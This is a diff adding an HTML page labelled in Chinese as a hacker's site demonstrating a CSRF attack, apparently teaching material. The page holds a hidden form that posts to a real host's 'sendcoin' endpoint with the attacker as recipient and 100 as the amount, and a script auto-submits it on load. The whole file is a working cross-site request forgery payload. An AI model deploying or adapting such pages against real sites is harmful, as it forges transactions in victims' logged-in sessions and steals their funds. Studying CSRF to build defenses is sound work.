@@ -1,0 +1,12 @@
+
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>黑客的站点：CSRF攻击演示</h1>
+  <form id='hacker-form' action="https://time.geekbang.org/sendcoin" method=POST>
+    <input type="hidden" name="user" value="hacker" />
+    <input type="hidden" name="number" value="100" />
+  </form>
+  <script> document.getElementById('hacker-form').submit(); </script>
+</body>
+</html>
